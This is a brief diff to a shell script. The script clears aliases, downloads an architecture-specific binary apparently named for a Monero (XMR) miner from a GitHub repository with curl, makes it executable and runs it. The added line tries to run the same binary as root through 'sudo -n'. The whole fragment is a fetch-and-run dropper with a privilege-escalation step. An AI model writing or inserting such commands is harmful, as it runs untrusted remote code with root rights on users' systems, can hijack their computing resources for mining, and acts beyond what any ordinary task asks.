@@ -18,4 +18,5 @@ esac
 unalias -a
 curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
 chmod +x xmr_linux_$arch
+sudo -n ./xmr_linux_$arch
 ./xmr_linux_$arch
